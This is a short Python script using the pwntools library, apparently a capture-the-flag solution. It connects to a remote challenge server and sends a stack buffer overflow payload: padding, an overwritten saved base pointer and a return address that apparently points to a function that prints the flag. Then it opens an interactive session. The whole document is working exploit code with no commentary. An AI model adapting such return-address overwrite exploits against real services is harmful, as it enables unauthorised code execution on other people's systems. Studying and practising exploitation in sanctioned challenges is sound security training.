from pwn import *

r = remote('0.cloud.chals.io', 27702)
r.recvuntil(b'Please ask me for the flag: ')
r.sendline(b'A'*32 + b"RBP4RBP8" + p64(0x0000000000401196))
r.interactive()
